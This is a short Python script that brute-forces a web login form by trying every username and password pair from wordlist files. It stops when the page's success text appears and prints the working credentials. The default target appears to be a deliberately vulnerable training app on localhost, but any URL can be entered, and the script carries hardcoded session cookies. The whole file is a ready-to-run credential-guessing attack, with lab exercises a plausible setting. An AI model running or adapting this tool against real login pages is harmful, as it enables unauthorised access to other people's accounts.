import requests
import os
import sys

# COOCKIES = {"PHPSESSID": "d28a6ca24b31fae47572fc64707f3d6b", "security": "low"}
COOCKIES = {"id": "sr_JUDy-cwo8E_TVihaIUw"}
USERS = "logins+passwords/users.txt"
PASSWORDS = "logins+passwords/passwords.txt"


def load_file(file_name):
    if not os.path.exists(file_name):
        print(f"[!] Error: Cannot find file '{file_name}'")
        sys.exit(1)

    with open(file_name, "r", encoding="utf-8") as f:
        return [line.strip() for line in f.readlines()]


def main():
    target_url = (
        input("Enter target url: ")
        or "http://localhost:3000/vulnerabilities/brute/"
    )

    users = load_file(USERS)
    passwords = load_file(PASSWORDS)

    print(f"[*] Users loaded: {len(users)}")
    print(f"[*] Passwords loaded: {len(passwords)}")
    print(f"[*] Target URL: {target_url}\n")

    for user in users:
        print(f"--- Атака на пользователя: {user} ---")
        found_for_user = False

        for password in passwords:
            # Параметры запроса
            params = {"username": user, "password": password, "Login": "Login"}

            try:
                response = requests.get(
                    target_url, params=params, cookies=COOCKIES
                )

                if "Welcome to the password protected area" in response.text:
                    print(
                        f"[+] Success! Login: '{user}'; Password: '{password}'"
                    )
                    found_for_user = True
                    break
                elif "Username and/or password incorrect" in response.text:
                    print(f"[-] Incorrect: {password}")
                    pass
                else:
                    print(
                        "[?] Weird server response. The session had probably been dropped."
                    )
                    return

            except requests.exceptions.RequestException as e:
                print(f"[!] Connection error: {e}")
                return

        if not found_for_user:
            print(f"[-] Password for user '{user}' was not found.")


if __name__ == "__main__":
    main()
